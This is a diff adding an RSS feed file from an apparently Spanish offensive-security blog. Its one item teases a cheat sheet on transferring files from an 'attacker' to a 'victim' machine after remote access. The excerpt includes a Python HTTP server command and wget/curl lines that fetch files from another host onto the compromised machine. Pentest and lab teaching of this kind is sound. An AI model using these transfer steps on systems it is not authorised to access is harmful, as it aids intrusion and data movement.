@@ -1,0 +1,21 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Read Team on Hack Pandora</title>
+    <link>https://hackpandora.github.io/es/categories/read-team/</link>
+    <description>Recent content in Read Team on Hack Pandora</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>es</language><atom:link href="https://hackpandora.github.io/es/categories/read-team/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Transferir Ficheros - Cheat Sheet</title>
+      <link>https://hackpandora.github.io/es/posts/filetransfer/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://hackpandora.github.io/es/posts/filetransfer/</guid>
+      <description>¡Bienvenidos a esta cheat sheet sobre los distintos métodos para la transferencia de archivos entre una máquina &amp;ldquo;atacante&amp;rdquo; y una máquina &amp;ldquo;víctima&amp;rdquo;!
+Cuando se consigue acceso a una máquina de forma remota, la capacidad de transferir archivos de manera efectiva es esencial. Esta guía proporciona una visión general de diversos métodos utilizados.
+Linux HTTP Server # Emisor python -m SimpleHTTPServer 80 # Receptor wget http://192.168.1.1/ArchivoTransferir o curl -o ArchivoTransferir http://192.</description>
+    </item>
+    
+  </channel>
+</rss>
